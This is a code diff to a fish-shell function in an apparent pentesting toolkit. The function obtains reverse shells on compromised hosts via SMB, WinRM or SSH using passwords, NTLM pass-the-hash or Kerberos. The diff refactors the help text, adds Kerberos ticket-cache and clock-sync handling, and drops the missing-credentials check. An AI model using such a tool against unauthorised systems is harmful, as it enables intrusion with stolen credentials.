@@ -7,49 +7,36 @@ function _ezpz_getshell
         return 1
     end
     
+    set -l usage "
+getshell - Get reverse shell from compromised hosts
+
+Usage: ezpz getshell -t <target> [options]
+
+Options:
+  -t, --target <ip>         Target host (Required)
+  -u, --username <user>     Username for authentication
+  -p, --password <pass>     Password for authentication
+  -H, --hash <hash>         NTLM hash for pass-the-hash
+  -d, --domain <domain>     Domain for authentication
+  -k, --kerberos            Use Kerberos authentication
+  -x, --protocol <proto>    Protocol to use (smb/winrm/ssh, default: winrm)
+  --port <port>             Reverse shell port (default: 9001)
+  -h, --help                Show this help message
+
+Examples:
+  ezpz getshell -t 192.168.1.10 -u administrator -H hash
+  ezpz getshell -t 192.168.1.20 -u root -p password -x ssh --port 4444
+  ezpz getshell -t 192.168.1.30 -u domain\\user -p pass -x smb -d domain.local
+"
+    
     if set -q _flag_help
-        echo "getshell - Get reverse shell from compromised hosts"
-        echo
-        echo "Usage: ezpz getshell -t <target> [options]"
-        echo
-        echo "Options:"
-        echo "  -t, --target <ip>         Target host (Required)"
-        echo "  -u, --username <user>     Username for authentication"
-        echo "  -p, --password <pass>     Password for authentication"
-        echo "  -H, --hash <hash>         NTLM hash for pass-the-hash"
-        echo "  -d, --domain <domain>     Domain for authentication"
-        echo "  -k, --kerberos            Use Kerberos authentication"
-        echo "  -x, --protocol <proto>    Protocol to use (smb/winrm/ssh, default: winrm)"
-        echo "  --port <port>             Reverse shell port (default: 9001)"
-        echo "  -h, --help                Show this help message"
-        echo
-        echo "Examples:"
-        echo "  ezpz getshell -t 192.168.1.10 -u administrator -H hash"
-        echo "  ezpz getshell -t 192.168.1.20 -u root -p password -x ssh --port 4444"
-        echo "  ezpz getshell -t 192.168.1.30 -u domain\\user -p pass -x smb -d domain.local"
+        echo $usage
         return 1
     end
     
     if not set -q _flag_target
         ezpz_error "Target IP required (-t)"
-        echo
-        echo "Usage: ezpz getshell -t <target> [options]"
-        echo
-        echo "Options:"
-        echo "  -t, --target <ip>         Target host (Required)"
-        echo "  -u, --username <user>     Username for authentication"
-        echo "  -p, --password <pass>     Password for authentication"
-        echo "  -H, --hash <hash>         NTLM hash for pass-the-hash"
-        echo "  -d, --domain <domain>     Domain for authentication"
-        echo "  -k, --kerberos            Use Kerberos authentication"
-        echo "  -x, --protocol <proto>    Protocol to use (smb/winrm/ssh, default: winrm)"
-        echo "  --port <port>             Reverse shell port (default: 9001)"
-        echo "  -h, --help                Show this help message"
-        echo
-        echo "Examples:"
-        echo "  ezpz getshell -t 192.168.1.10 -u administrator -H hash"
-        echo "  ezpz getshell -t 192.168.1.20 -u root -p password -x ssh --port 4444"
-        echo "  ezpz getshell -t 192.168.1.30 -u domain\\user -p pass -x smb -d domain.local"
+        echo $usage
         return 1
     end
     
@@ -67,6 +54,7 @@ function _ezpz_getshell
     
     if not contains $protocol smb winrm ssh
         ezpz_error "Invalid protocol: $protocol. Use smb, winrm, or ssh"
+        echo $usage
         return 1
     end
     
@@ -76,6 +64,7 @@ function _ezpz_getshell
         set -a auth_args -u $_flag_username
     else
         ezpz_error "Username required (-u)"
+        echo $usage
         return 1
     end
     
@@ -85,15 +74,19 @@ function _ezpz_getshell
         set -a auth_args -H $_flag_hash
     else if set -q _flag_kerberos
         set -a auth_args -k
-    else
-        ezpz_error "Authentication method required (-p, -H, or -k)"
-        return 1
+        if set -q KRB5CCNAME
+            set -a auth_args --use-kcache
+            ezpz_cmd "Using KRB5CCNAME at $KRB5CCNAME"
+        end
+        # Time synchronization for Kerberos
+        if command -v ntpdate >/dev/null 2>&1
+            ezpz_info "Synchronizing clock with DC for Kerberos authentication..."
+            sudo ntpdate -u $target >/dev/null 2>&1
+        else
+            ezpz_warn "ntpdate not found. Skipping time sync. Kerberos may fail if clocks are skewed."
+        end
     end
 
-    if set -q _flag_kerberos
-        set -a auth_args -k
-    end
-    
     if set -q _flag_domain
         set -a auth_args -d $_flag_domain
     end
